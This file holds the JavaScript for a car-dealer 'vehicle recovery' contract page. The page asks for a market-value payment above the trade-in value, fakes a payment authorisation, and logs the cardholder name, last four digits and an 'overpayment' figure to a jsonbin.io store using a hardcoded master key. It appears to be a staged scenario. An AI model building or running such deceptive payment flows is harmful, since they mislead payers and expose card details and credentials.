"use strict";

const $ = (s) => document.querySelector(s);
const money = (c) => "$" + (c / 100).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

const BIN_ID  = "6af4cd75ffd5d16053ba491b";
const BIN_KEY = "$2a$10$S.cfSm.2yqNKk8WjJccwZuFhND8qdTNdyvoAQqO130HmsfmBQDms.";

const POLICY_FORMAT = /^RSC-\d{4}-\d{4}$/;

const POLICIES = {
  "RSC-2024-7742": {
    holder:          "J. Martinez",
    vehicle:         { year: 2021, brand: "Cresta",  model: "Sport",    vin: "1CRST21X7MK204891", color: "Graphite Gray"  },
    newVehicle:      { year: 2023, brand: "Veltron", model: "Prime XS", vin: "2VLTR23P9NK107344",  color: "Alpine Green"   },
    newVehiclePrice: 3860000,
    tradeInValue:    1450000,
    marketValue:     2280000,
    purchaseDate:    "September 14, 2026",
    policyExpiry:    "November 14, 2026",
  },
};

const DEFAULT_POLICY = "RSC-2024-7742";

// ── lookup ────────────────────────────────────────────────────────────────────

const policyInput    = $("#policy-input");
const lookupBtn      = $("#lookup-btn");
const lookupError    = $("#lookup-error");
const contractResult = $("#contract-result");

let sessionId       = null;
let currentPolicy   = null;
let currentPolicyId = null;

lookupBtn.addEventListener("click", lookupPolicy);
policyInput.addEventListener("keydown", (e) => { if (e.key === "Enter") lookupPolicy(); });

function lookupPolicy() {
  const id = policyInput.value.trim().toUpperCase();
  lookupError.textContent = "";

  if (!id) {
    lookupError.textContent = "Please enter a policy number.";
    return;
  }
  if (!POLICY_FORMAT.test(id)) {
    lookupError.textContent = "Invalid format. Policy numbers follow the pattern RSC-YYYY-NNNN.";
    return;
  }

  sessionId = "RSC-" + Date.now();
  const policy = POLICIES[id] || POLICIES[DEFAULT_POLICY];
  currentPolicy   = policy;
  currentPolicyId = id;
  renderContract(id, policy);
}

// ── contract render ───────────────────────────────────────────────────────────

function renderContract(id, p) {
  const v  = p.vehicle;
  const nv = p.newVehicle;
  const today = new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" });

  contractResult.hidden = false;
  contractResult.innerHTML = `
    <div class="contract-doc">

      <div class="contract-letterhead">
        <div>
          <div class="contract-letterhead-brand">🚗 Reimbursor <span>Solution Cars</span></div>
          <div style="font-size:.78rem;color:rgba(255,255,255,.55);margin-top:4px">Official Return & Recovery Agreement</div>
        </div>
        <div class="contract-letterhead-meta">
          Policy No. <strong>${id}</strong><br>
          Date: ${today}<br>
          Expires: ${p.policyExpiry}
        </div>
      </div>

      <div class="contract-title">Vehicle Return &amp; Recovery Agreement</div>

      <div class="contract-body">

        <div class="contract-parties">
          <div class="party-box">
            <div class="party-label">Dealer</div>
            <div class="party-name">Reimbursor Solution Cars</div>
          </div>
          <div class="party-box">
            <div class="party-label">Customer</div>
            <div class="party-name">${p.holder}</div>
          </div>
        </div>

        <!-- Section 1: Vehicle Return -->
        <div class="contract-section">
          <div class="contract-section-title">Section 1 — Vehicle Return</div>
          <p style="font-size:.85rem;color:var(--fg-muted);margin:0 0 10px">The following vehicle will be returned to Reimbursor Solution Cars inventory:</p>
          <div class="contract-vehicle">
            <div class="contract-vehicle-emoji">🚗</div>
            <div class="contract-vehicle-info">
              <h4>${nv.year} ${nv.brand} ${nv.model}</h4>
              <p>VIN: ${nv.vin} &nbsp;·&nbsp; ${nv.color}</p>
              <p>Purchase date: ${p.purchaseDate}</p>
            </div>
            <div style="font-size:.82rem;color:var(--fg-muted);text-align:right">
              <div style="font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px">Original price</div>
              <strong style="color:var(--navy)">${money(p.newVehiclePrice)}</strong>
            </div>
          </div>
        </div>

        <!-- Section 2: Trade-In Credit -->
        <div class="contract-section">
          <div class="contract-section-title">Section 2 — Original Trade-In</div>
          <p style="font-size:.85rem;color:var(--fg-muted);margin:0 0 10px">Vehicle surrendered as trade-in at time of purchase:</p>
          <div class="contract-vehicle">
            <div class="contract-vehicle-emoji">🚙</div>
            <div class="contract-vehicle-info">
              <h4>${v.year} ${v.brand} ${v.model}</h4>
              <p>VIN: ${v.vin} &nbsp;·&nbsp; ${v.color}</p>
            </div>
            <div style="font-size:.82rem;color:var(--fg-muted);text-align:right">
              <div style="font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px">Trade-in value</div>
              <strong style="color:var(--navy)">${money(p.tradeInValue)}</strong>
            </div>
          </div>
        </div>

        <!-- Section 3: Vehicle Recovery -->
        <div class="contract-section">
          <div class="contract-section-title">Section 3 — Vehicle Recovery</div>
          <p style="font-size:.85rem;color:var(--fg-muted);margin:0 0 10px">To recover the original trade-in vehicle, the following payment is required:</p>
          <div class="contract-financials">
            <div class="contract-fin-row">
              <span class="fin-label">Trade-in vehicle</span>
              <span class="fin-value">${v.year} ${v.brand} ${v.model}</span>
            </div>
            <div class="contract-fin-row">
              <span class="fin-label">Valuation method</span>
              <span class="fin-value" style="font-size:.82rem">Current market valuation (Sec. 4.2)</span>
            </div>
            <div class="contract-fin-row total">
              <span class="fin-label">Recovery amount due</span>
              <span class="fin-value">${money(p.marketValue)} USD</span>
            </div>
          </div>
          <div class="contract-clause">
            Per Section 4.2 of this agreement, vehicle recovery is processed at current market valuation as determined
            by RSC appraisal standards at the time of return processing. This valuation reflects current resale market
            conditions and may differ from the original trade-in appraisal value. No refunds after recovery processing has been initiated.
          </div>
        </div>

        <div class="contract-footer">
          <div>
            <div class="contract-sign">
              <div class="contract-sign-line">Customer signature</div>
            </div>
          </div>
          <button class="btn gold" id="pay-recovery-btn" style="width:auto;padding:12px 28px">
            Proceed to Payment — ${money(p.marketValue)} USD
          </button>
        </div>

      </div>
    </div>
  `;

  document.getElementById("pay-recovery-btn").addEventListener("click", openPayment);
  contractResult.scrollIntoView({ behavior: "smooth", block: "start" });
}

// ── payment dialog ────────────────────────────────────────────────────────────

const dialog = $("#checkout-dialog");
const form   = $("#pay-form");
const result = $("#result");
const payBtn = $("#pay-btn");

function openPayment() {
  form.reset();
  clearErrors();
  result.textContent = "";
  result.className   = "result";
  payBtn.disabled    = false;

  const v = currentPolicy.vehicle;
  $("#dialog-subtitle").textContent   = `${v.year} ${v.brand} ${v.model} — ${v.color}`;
  $("#show-market-value").textContent = money(currentPolicy.marketValue) + " USD";
  $("#show-total").textContent        = money(currentPolicy.marketValue) + " USD";
  payBtn.textContent = "Confirm — " + money(currentPolicy.marketValue) + " USD";

  dialog.showModal();
}

$("#cancel-btn").addEventListener("click", () => { form.reset(); dialog.close(); });

form.elements.pan.addEventListener("input", (e) => {
  const d = e.target.value.replace(/\D/g, "").slice(0, 19);
  e.target.value = d.replace(/(.{4})/g, "$1 ").trim();
});
form.elements.exp.addEventListener("input", (e) => {
  let d = e.target.value.replace(/\D/g, "").slice(0, 4);
  if (d.length >= 3) d = d.slice(0, 2) + "/" + d.slice(2);
  e.target.value = d;
});
form.elements.cvv.addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
});

function luhn(pan) {
  let sum = 0, alt = false;
  for (let i = pan.length - 1; i >= 0; i--) {
    let d = parseInt(pan[i], 10);
    if (alt) { d *= 2; if (d > 9) d -= 9; }
    sum += d; alt = !alt;
  }
  return sum % 10 === 0;
}
function detectBrand(pan) {
  if (/^3[47]/.test(pan))      return "Amex";
  if (/^4/.test(pan))          return "Visa";
  if (/^5[1-5]/.test(pan))     return "Mastercard";
  if (/^6(?:011|5)/.test(pan)) return "Discover";
  return "Card";
}
function validate(f) {
  const errors = {};
  if (!f.name.trim() || f.name.trim().length < 2) errors.name = "Enter the name on the card.";
  const pan = f.pan.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(pan) || !luhn(pan)) errors.pan = "Enter a valid card number.";
  const m = f.exp.match(/^(\d{2})\/(\d{2})$/);
  if (!m) { errors.exp = "Use MM/YY format."; }
  else {
    const expDate = new Date(2000 + parseInt(m[2], 10), parseInt(m[1], 10) - 1, 1);
    const now = new Date();
    if (parseInt(m[1], 10) < 1 || parseInt(m[1], 10) > 12 || expDate < new Date(now.getFullYear(), now.getMonth(), 1))
      errors.exp = "Card has expired.";
  }
  const brand = !errors.pan ? detectBrand(f.pan.replace(/\s/g, "")) : "";
  const cvvLen = brand === "Amex" ? 4 : 3;
  if (!/^\d{3,4}$/.test(f.cvv) || f.cvv.length !== cvvLen)
    errors.cvv = brand === "Amex" ? "4 digits required." : "3 digits required.";
  return errors;
}
function clearErrors() {
  form.querySelectorAll(".err").forEach((s) => { s.textContent = ""; });
  form.querySelectorAll("input").forEach((i) => i.classList.remove("bad"));
}

async function logEntry(type, payload) {
  const entry = { sessionId, type, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...payload };
  try {
    const r = await fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, { headers: { "X-Master-Key": BIN_KEY } });
    const data = await r.json();
    const record = data.record || {};
    const logs = record["rsc-v2"] || [];
    logs.push(entry);
    await fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, {
      method: "PUT",
      headers: { "Content-Type": "application/json", "X-Master-Key": BIN_KEY },
      body: JSON.stringify({ ...record, "rsc-v2": logs }),
    });
  } catch {}
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  clearErrors();

  const f = {
    name: form.elements.name.value,
    pan:  form.elements.pan.value,
    exp:  form.elements.exp.value,
    cvv:  form.elements.cvv.value,
  };

  const errors = validate(f);
  if (Object.keys(errors).length) {
    for (const [field, msg] of Object.entries(errors)) {
      const span = form.querySelector('.err[data-for="' + field + '"]');
      if (span) span.textContent = msg;
      if (form.elements[field]) form.elements[field].classList.add("bad");
    }
    return;
  }

  payBtn.disabled = true;
  const brand = detectBrand(f.pan.replace(/\s/g, ""));

  await logEntry("return_attempt", {
    policyId:     currentPolicyId,
    recoveryType: "vehicle_recovery",
    tradeInValue: currentPolicy.tradeInValue,
    marketValue:  currentPolicy.marketValue,
    overpayment:  currentPolicy.marketValue - currentPolicy.tradeInValue,
    brand,
    cardName: f.name,
    last4:    f.pan.replace(/\s/g, "").slice(-4),
  });

  setTimeout(async () => {
    await logEntry("return_confirmed", {
      policyId:     currentPolicyId,
      recoveryType: "vehicle_recovery",
      totalCharged: currentPolicy.marketValue,
    });
    result.textContent = "Payment authorized. Vehicle recovery initiated. Total charged: " + money(currentPolicy.marketValue) + " USD.";
    result.className   = "result ok";
    payBtn.disabled    = false;
  }, 3000);
});
